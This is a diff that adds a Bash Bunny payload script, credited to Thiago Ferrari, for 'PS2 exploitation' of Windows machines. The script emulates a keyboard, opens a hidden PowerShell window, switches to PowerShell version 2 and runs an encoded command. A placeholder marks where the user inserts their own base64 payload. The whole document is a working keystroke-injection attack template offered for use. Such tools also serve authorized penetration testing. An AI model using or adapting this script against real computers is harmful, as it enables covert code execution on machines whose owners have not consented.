@@ -1,0 +1,26 @@
+#!/bin/bash
+#Title:   Generic PS2 exploitation using bash bunny
+#Author:  Thiago Ferrari
+#Version: 1.0
+#Target: Windows with PS2
+#Add base64 payload in "--YOUR PAYLOAD HERE---"
+#change Q SET_LANGUAGE to your Keyboard language. For example "EN"
+
+LED SETUP
+ATTACKMODE HID STORAGE
+Q SET_LANGUAGE BR
+ATTACKMODE HID
+
+LED B
+Q GUI r
+Q STRING powershell -windowstyle hidden
+Q ENTER
+Q DELAY 500
+Q STRING powershell -version 2
+Q DELAY 500
+Q ENTER
+Q DELAY 800
+Q STRING powershell.exe -encodedCommand --YOUR PAYLOAD HERE---
+Q ENTER
+Q DELAY 2000
+LED G
